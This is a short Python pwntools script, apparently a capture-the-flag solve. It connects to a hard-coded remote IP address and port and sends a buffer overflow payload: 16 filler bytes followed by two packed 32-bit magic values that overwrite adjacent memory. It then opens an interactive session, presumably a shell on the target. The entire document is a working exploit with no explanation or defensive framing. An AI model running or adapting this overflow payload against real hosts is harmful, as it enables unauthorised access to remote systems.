from pwn import *

p = remote("45.76.177.238", 1569)
p.recv()
p.sendline(b'a'*16+p32(0xcafe69)+p32(0x1569))

p.sendline(b'')

p.interactive()